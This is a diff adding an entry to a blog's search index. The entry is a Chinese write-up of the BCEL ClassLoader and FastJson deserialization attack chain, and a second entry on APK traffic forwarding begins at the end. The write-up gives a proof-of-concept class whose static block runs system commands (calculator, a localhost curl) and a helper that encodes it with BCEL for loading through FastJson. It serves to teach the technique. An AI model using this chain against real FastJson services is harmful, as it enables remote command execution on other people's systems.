@@ -1,6 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BCEL FastJson攻击链分析</title>
+    <url>/JAVA%E5%AE%89%E5%85%A8/BCEL%20FastJson%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>需要提前了解什么是<code>类加载机制</code></p>
+</blockquote>
+<p>认真看完了<code>ClassLoader</code>，就想着写一篇与之相关的的攻击链分析。</p>
+<span id="more"></span>
+
+<h1 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h1><p>想要了解这个攻击链，得先了解什么是<code>BCEL ClassLoader</code> 。</p>
+<p><a href="https://commons.apache.org/proper/commons-bcel/" title="BCEL">BCEL</a>（<code>Apache Commons BCEL™</code>）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名<code>org.apache.bcel.util.ClassLoader</code>为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 。</p>
+<h1 id="BCEL攻击原理"><a href="#BCEL攻击原理" class="headerlink" title="BCEL攻击原理"></a>BCEL攻击原理</h1><p>截取BCEL的ClassLoader类部分代码。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="string">&quot;$$BCEL$$&quot;</span>.length());</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">            <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            clazz = parser.parse();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            var8.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line">        <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(), (<span class="type">byte</span>)<span class="number">7</span>);</span><br><span class="line">        <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(), (<span class="type">byte</span>)<span class="number">1</span>);</span><br><span class="line">        name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由以上源码可以看出BCEL的类加载器在解析类名时会对ClassName中有<code>$$BCEL$$</code>标识的类做特殊处理。</p>
+<p>当BCEL的<code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>加载一个类名中带有<code>$$BCEL$$</code>的类时会截取出<code>$$BCEL$$</code>后面的字符串，然后使用<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用<code>defineClass</code>注册解码后的类，一旦该类被加载就会触发类中的恶意代码。</p>
+<h1 id="利用BCEL进行命令执行"><a href="#利用BCEL进行命令执行" class="headerlink" title="利用BCEL进行命令执行"></a>利用BCEL进行命令执行</h1><p>构造恶意类<strong>TestBCELClass</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCELClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span>  <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;calc 12345678901234567&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Linux&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;curl localhost:9999/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在对其使用BCEL编码com.anbai.sec.classloader.TestBCELClass类字节码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bcelEncode</span><span class="params">(File classFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(FileUtils.readFileToByteArray(classFile), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>有一定基础的朋友就会发现，只是注入了类名和类加载器并不足以触发类加载，导致命令执行的关键问题就在于FastJson会自动调用getter方法，<code>org.apache.commons.dbcp.BasicDataSource</code>本没有<code>connection</code>成员变量，但有一个<code>getConnection()</code>方法，按理来讲应该不会调用<code>getConnection()</code>方法，但是FastJson会通过<code>getConnection()</code>这个方法名计算出一个名为<code>connection</code>的field，因此FastJson最终还是调用了<code>getConnection()</code>方法。</p>
+<p>当<code>getConnection()</code>方法被调用时就会使用注入进来的<code>org.apache.bcel.util.ClassLoader</code>类加载器加载注入进来恶意类字节码</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_DR1kCydpgI.png"></p>
+<p>注意：Java将BCEL升级到6.0时用的是一个删除了ClassLoader版本的BCEL，所以这个利用链只能用来学习。</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>BCEL</tag>
+        <tag>JAVA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APK流量转发</title>
     <url>/APP/APK%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为一个渗透人，不仅要日WEB还得日app和小程序，由此就写了此文</p>
